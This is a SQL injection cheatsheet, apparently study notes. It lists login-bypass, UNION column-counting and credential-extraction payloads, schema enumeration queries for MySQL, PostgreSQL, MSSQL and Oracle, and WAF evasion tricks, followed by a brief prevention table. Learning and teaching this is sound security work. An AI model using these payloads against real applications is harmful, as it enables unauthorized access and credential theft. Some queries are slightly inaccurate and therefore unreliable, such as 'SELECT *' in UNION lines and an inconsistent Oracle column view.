# SQL Injection Cheatsheet

---

## Comment Syntax

| Database | Comment |
|----------|---------| 
| MySQL | `#` or `-- ` (note: `-- ` requires a trailing space in MySQL; `#` is safer for URL-based payloads) |
| PostgreSQL | `--` |
| Microsoft SQL Server | `--` or `/**/` |
| Oracle | `--` |

---

## Version Queries

| Database | Query | Returns |
|----------|-------|---------|
| MySQL / MSSQL | `SELECT @@version` | Full version string |
| Oracle | `SELECT BANNER FROM v$version` | Full version string |
| PostgreSQL | `SELECT version()` | Full version string |

> **Oracle note:** `v$instance` also has a `VERSION` column, but it only returns the short version number (e.g. `19.0.0.0.0`). Use `v$version.BANNER` for the full string.

---

## Oracle-Specific Rules

| Rule | Detail |
|------|--------|
| `FROM dual` | Oracle requires every `SELECT` to reference a table. `dual` is a built-in dummy table that always exists and always returns one row – use it when you don't need real data (e.g. `UNION SELECT 'a','b' FROM dual`) |

---

## Standard Payloads

### WHERE Clause Bypass
```sql
' OR 1=1--          # Returns all rows (always true)
' OR 'a'='a'--      # Alternative always-true condition
```

### Login Bypass
```sql
administrator'--    # Comments out password check
' OR 1=1--          # Bypasses both username and password check
```

### UNION Attack – Determine Number of Columns
```sql
-- Generic (MySQL, PostgreSQL, MSSQL)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
-- Keep adding NULLs until no error → that's the column count

-- Oracle (dual table required)
' UNION SELECT 'a' FROM dual--
' UNION SELECT 'a','b' FROM dual--
```

### UNION Attack – Extract Data
```sql
' UNION SELECT username,password FROM users--
' UNION SELECT username || '~' || password FROM users--   # Concatenate into one column (Oracle/PostgreSQL)
```

---

## Database Enumeration

### List Tables
```sql
-- MySQL / PostgreSQL / MSSQL
' UNION SELECT * FROM information_schema.tables--

-- Oracle
' UNION SELECT * FROM all_tables--
```

### List Columns
```sql
-- MySQL / PostgreSQL / MSSQL
' UNION SELECT * FROM information_schema.columns WHERE table_name='users'--

-- Oracle
' UNION SELECT * FROM all_col_comments WHERE table_name='users'--
```

---

## WAF Bypass Techniques

| Technique | Example |
|-----------|---------| 
| HTML hex encoding (via Hackvertor) | Encode payload so WAF doesn't recognize SQL keywords |
| Case variation | `SeLeCt`, `uNiOn` |
| Inline comments | `UN/**/ION SEL/**/ECT` |
| URL encoding | `%27` instead of `'` |

> WAFs are not a reliable defense – bypass is often trivial. Real protection happens at the code level.

---

## Defense: How to Prevent SQLi

| ❌ Vulnerable | ✅ Secure |
|--------------|----------|
| String concatenation in queries | Prepared Statements / Parameterized Queries |
| Trusting user input | Input validation + whitelisting |
| Relying on WAF only | Defense in depth at code level |
| Verbose error messages | Generic error messages |

---

## Database Enumeration – information_schema (non-Oracle)

`information_schema` is a built-in meta-database available in MySQL, PostgreSQL and MSSQL (not Oracle). It contains information about all tables and columns in the database.


## Database Enumeration – Oracle

### List all Tables
```sql
' UNION SELECT * FROM all_tables--
```

### List Columns of a specific Table
```sql
' UNION SELECT * FROM all_tab_columns WHERE table_name='USERS'--
```
